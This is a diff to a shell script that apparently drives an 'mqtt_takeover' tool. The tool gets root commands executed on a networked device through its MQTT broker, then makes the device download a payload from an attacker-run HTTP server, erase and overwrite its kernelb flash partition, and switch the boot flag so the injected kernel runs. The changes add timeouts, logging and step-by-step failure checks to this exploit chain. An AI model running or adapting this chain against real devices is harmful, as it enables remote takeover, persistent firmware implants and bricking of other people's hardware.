@@ -72,7 +72,7 @@ if [ -z "$SECRET" ]; then
 fi
 
     root_cmd() {
-    "$PY" "$HERE/tools/mqtt_takeover.py" --host "$HOST" --port 1883 \
+    timeout "$(( ${2:-12} + 15 ))" "$PY" "$HERE/tools/mqtt_takeover.py" --host "$HOST" --port 1883 \
         --deviceid "$DEVICEID" --role satellite --secret "$SECRET" \
         --cmd "id; $1" --listen "${2:-12}" 2>&1 |
         strings |
@@ -130,7 +130,11 @@ HTTP_PORT=${HTTP_PORT:-8000}
 HTTP_IP=${HTTP_IP:-192.168.10.88}
 
 serve_and_push() {
-    ( cd "$1" && python3 -m http.server "$HTTP_PORT" --bind "$HTTP_IP" >/dev/null 2>&1 ) &
+    echo "[*] serving http://$HTTP_IP:$HTTP_PORT (the box must reach this port)"
+    pkill -f "http.server $HTTP_PORT" 2>/dev/null || true
+    sleep 0.5
+    : > "$HERE/build/linux-kbuild/http-fire.log"
+    ( cd "$1" && python3 -m http.server "$HTTP_PORT" --bind "$HTTP_IP" >> "$HERE/build/linux-kbuild/http-fire.log" 2>&1 ) &
     SRV=$!
     sleep 1
 }
@@ -186,7 +190,17 @@ fire)
     cp "$SLICE" "$HERE/build/linux-kbuild/tmp-payload-slice.bin"
     serve_and_push "$HERE"
     echo "[*] writing the image to kernelb via the broker channel"
-    OUT=$(root_cmd "set -e; cd /tmp; wget -q -O slice.bin http://$HTTP_IP:$HTTP_PORT/build/linux-kbuild/tmp-payload-slice.bin; test \"\$(stat -c %s slice.bin)\" = \"$SLICE_SIZE\"; test \"\$(md5sum slice.bin | cut -d' ' -f1)\" = \"$SLICE_MD5\"; mtd erase kernelb; mtd write slice.bin kernelb; mtd verify slice.bin kernelb; ln -sf /bin/fw_printenv /tmp/fw_setenv; /tmp/fw_setenv bootflag b; fw_printenv bootflag; sync; echo FIRE_OK" 180) || {
+    FIRE_CMD="set -e; cd /tmp; \
+wget -O slice.bin http://$HTTP_IP:$HTTP_PORT/build/linux-kbuild/tmp-payload-slice.bin 2>/tmp/wget.log || { echo WGET_FAIL; tail -3 /tmp/wget.log; exit 1; }; \
+test \"\$(stat -c %s slice.bin)\" = \"$SLICE_SIZE\" || { echo SIZE_FAIL; exit 1; }; \
+test \"\$(md5sum slice.bin | cut -d' ' -f1)\" = \"$SLICE_MD5\" || { echo MD5_FAIL; exit 1; }; \
+mtd erase kernelb || { echo ERASE_FAIL; exit 1; }; \
+mtd write slice.bin kernelb || { echo WRITE_FAIL; exit 1; }; \
+mtd verify slice.bin kernelb || { echo VERIFY_FAIL; exit 1; }; \
+ln -sf /bin/fw_printenv /tmp/fw_setenv; \
+/tmp/fw_setenv bootflag b || { echo SETENV_FAIL; exit 1; }; \
+fw_printenv bootflag; sync; echo FIRE_OK"
+    OUT=$(root_cmd "$FIRE_CMD" 240) || {
         stop_serve
         echo "error: the broker fire command failed" >&2
         exit 1
